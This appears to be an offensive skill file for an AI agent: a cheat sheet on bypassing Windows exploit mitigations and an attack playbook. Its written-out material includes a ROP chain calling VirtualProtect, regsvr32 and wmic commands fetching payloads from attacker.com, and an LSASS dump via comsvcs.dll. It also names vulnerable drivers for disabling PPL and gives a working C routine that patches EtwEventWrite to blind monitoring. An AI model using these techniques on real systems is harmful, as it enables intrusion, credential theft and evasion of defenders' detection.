---
name: windows-mitigations-bypass
description: Windows exploit mitigation bypass — ASLR, DEP/NX, CFG/XFG, CET/Shadow Stack, SEHOP, ACG, WDAC, ASR, PPL, AMSI, ETW blinding
metadata:
  type: offensive
  phase: exploitation
  ---

# Windows Mitigations & Bypass

## When to Activate

- Planning exploit mitigation bypass strategies
- Understanding Windows security architecture depth
- Researching WDAC/ASR/PPL bypass vectors
- Fingerprinting target mitigation landscape before exploitation

## Mitigation Landscape

```
SYSTEM-LEVEL                    PROCESS-LEVEL
─────────────                   ─────────────
VBS/HVCI                        DEP/NX
WDAC/CI                         ASLR (Bottom-up, High Entropy)
Secure Boot                     CFG/XFG
Credential Guard                CET/Shadow Stack
KDP (Kernel Data Protection)    ACG (Arbitrary Code Guard)
KASLR                           CIG (Code Integrity Guard)
                                Child Process Policy
```

## Recon & Fingerprinting

```c
// Check system mitigations
// VBS/HVCI: HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard
// Credential Guard: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LsaCfgFlags
// Secure Boot: HKLM\SYSTEM\CurrentControlSet\Control\SecureBoot\State

// Check process mitigations
GetProcessMitigationPolicy(hProcess, ProcessDEPPolicy, &dep, sizeof(dep));
GetProcessMitigationPolicy(hProcess, ProcessASLRPolicy, &aslr, sizeof(aslr));
GetProcessMitigationPolicy(hProcess, ProcessControlFlowGuardPolicy, &cfg, sizeof(cfg));
GetProcessMitigationPolicy(hProcess, ProcessDynamicCodePolicy, &acg, sizeof(acg));
```

```powershell
# PowerShell enumeration
Get-ProcessMitigation -System
Get-ProcessMitigation -Name chrome.exe
# Find weak processes (missing mitigations)
Get-Process | ForEach-Object { Get-ProcessMitigation -Id $_.Id 2>$null }
```

## DEP/NX Bypass

**What it does**: Marks stack/heap as non-executable. Code on stack won't run.

**Bypass techniques**:
- ROP (Return-Oriented Programming) — chain existing code gadgets
- ret2libc — call VirtualProtect/VirtualAlloc to make region executable
- JIT spray — abuse JIT compilers that generate executable code

```python
# ROP to call VirtualProtect(shellcode_addr, size, PAGE_EXECUTE_READWRITE, &old)
from pwn import *
rop = ROP(elf)
rop.call('VirtualProtect', [shellcode_addr, 0x1000, 0x40, writable_addr])
rop.call(shellcode_addr)
```

## ASLR Bypass

**What it does**: Randomizes base addresses of modules, stack, heap.

**Bypass techniques**:
- Information leak (format string, partial overwrite, side-channel)
- Partial overwrite (last 12 bits are fixed — page offset)
- Non-ASLR modules (legacy DLLs compiled without /DYNAMICBASE)
- Brute force (32-bit: only 8 bits of entropy for some regions)
- Heap spray (predictable addresses at high allocations)

```bash
# Find non-ASLR modules
# Process Hacker → Module tab → check DllCharacteristics for DYNAMIC_BASE
# Or: dumpbin /headers module.dll | findstr "Dynamic base"
```

## CFG (Control Flow Guard) Bypass

**What it does**: Validates indirect call targets against a bitmap of valid targets.

**Bypass techniques**:
- Call existing valid targets (dispatch gadgets)
- Corrupt the CFG bitmap (requires write primitive)
- COOP (Counterfeit Object-Oriented Programming) — chain virtual method calls
- Target functions not in the bitmap (dynamically generated code)
- JIT spray to create valid targets

```c
// CFG validates: call [rax] → is target in bitmap?
// Bypass: find "universal gadget" that's a valid CFG target
// Example: longjmp, coroutine dispatch, virtual destructors
```

## CET / Shadow Stack Bypass

**What it does**: Hardware-enforced return address protection. Shadow stack stores copy of return addresses.

**Bypass techniques**:
- CET is relatively new — not all processes opt in
- Signal/exception handler abuse (legitimate stack unwinding)
- JOP (Jump-Oriented Programming) — avoid RET entirely
- Overwrite shadow stack via kernel vulnerability
- Target processes without CET enabled

## ACG (Arbitrary Code Guard) Bypass

**What it does**: Prevents dynamic code generation (no RWX, no VirtualProtect to RX).

**Bypass techniques**:
- Use existing executable code (ROP/JOP only)
- Abuse JIT processes that have ACG exceptions
- Cross-process: inject into process without ACG
- Abuse shared memory sections mapped as executable

## WDAC (Windows Defender Application Control) Bypass

**What it does**: Only allows execution of signed/approved binaries.

**Bypass techniques**:
```powershell
# LOLBins that are WDAC-allowed but can execute arbitrary code:
# MSBuild.exe — compile and execute inline C#
MSBuild.exe payload.csproj

# InstallUtil.exe — execute via Uninstall method
InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

# Regsvr32.exe — scriptlet execution
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# WMIC — XSL script execution
wmic process list /format:"http://attacker.com/payload.xsl"

# Managed DLL search order hijack in WDAC-allowed apps
# Find allowed app that loads DLL from writable location
```

## ASR (Attack Surface Reduction) Bypass

**What it does**: Rules blocking common attack behaviors (Office macros, child processes, credential theft).

**Bypass techniques**:
```powershell
# Check active ASR rules
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids

# Common bypasses:
# "Block Office from creating child processes" → use COM objects instead
# "Block credential stealing from LSASS" → use direct syscalls, not API
# "Block executable content from email" → HTML smuggling
# "Block JS/VBS from launching executables" → use WMI or COM
```

## PPL (Protected Process Light) Bypass

**What it does**: Prevents unsigned code from accessing protected processes (LSASS, csrss).

**Bypass techniques**:
```bash
# BYOVD: Load vulnerable signed driver to disable PPL
# Known vulnerable drivers: RTCore64.sys, dbutil_2_3.sys, ene.sys
# Use driver to:
# 1. Zero out EPROCESS.Protection field
# 2. Or: remove kernel callbacks

# PPLdump: exploit PPL-allowed DLL loading
# Mimikatz driver: mimidrv.sys (if you can load it)

# Alternative: dump LSASS via comsvcs.dll (MiniDump)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> dump.bin full
# Note: heavily monitored by EDRs now
```

## ETW Blinding

```c
// Patch EtwEventWrite in ntdll (blinds userland ETW consumers)
// Patch NtTraceEvent for kernel-level (requires driver)

// Userland patch:
void PatchETW() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    void* addr = GetProcAddress(ntdll, "EtwEventWrite");
    DWORD old;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)addr = 0xC3; // ret
    VirtualProtect(addr, 1, old, &old);
}

// Also patch:
// - EtwEventWriteFull
// - EtwEventWriteTransfer
// - NtTraceControl (for disabling providers)
```

### Selective ETW Patching
```c
// Instead of blanket patching, disable specific providers:
// Microsoft-Windows-PowerShell: {A0C1853B-5C40-4B15-8766-3CF1C58F985A}
// Microsoft-Windows-DotNETRuntime: {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
// Microsoft-Antimalware-Scan-Interface: {2A576B87-09A7-520E-C21A-4942F0271D67}
```

## Credential Guard Bypass

**What it does**: Isolates LSASS secrets in a Hyper-V protected container (VTL1).

**Bypass techniques**:
- Cannot dump credentials from memory (they're in secure enclave)
- Alternatives: Kerberos ticket theft (still in VTL0 memory)
- DCSync (if you have replication rights)
- Keylogging (capture credentials as typed)
- DPAPI abuse (user keys still accessible)
- Over-pass-the-hash with Kerberos tickets

## Mitigation Fingerprint → Attack Strategy

| If Active | Then |
|-----------|------|
| HVCI ON | Need signed driver (BYOVD) for kernel access |
| HVCI OFF | Can load unsigned driver |
| Credential Guard ON | No LSASS dump — use DCSync/tickets |
| Credential Guard OFF | Mimikatz works |
| WDAC ON | LOLBin execution only |
| WDAC OFF | Direct execution possible |
| CFG ON | ROP/JOP with valid targets only |
| ACG ON | No shellcode injection — ROP only |
| CET ON | No ROP — JOP or find CET-disabled process |
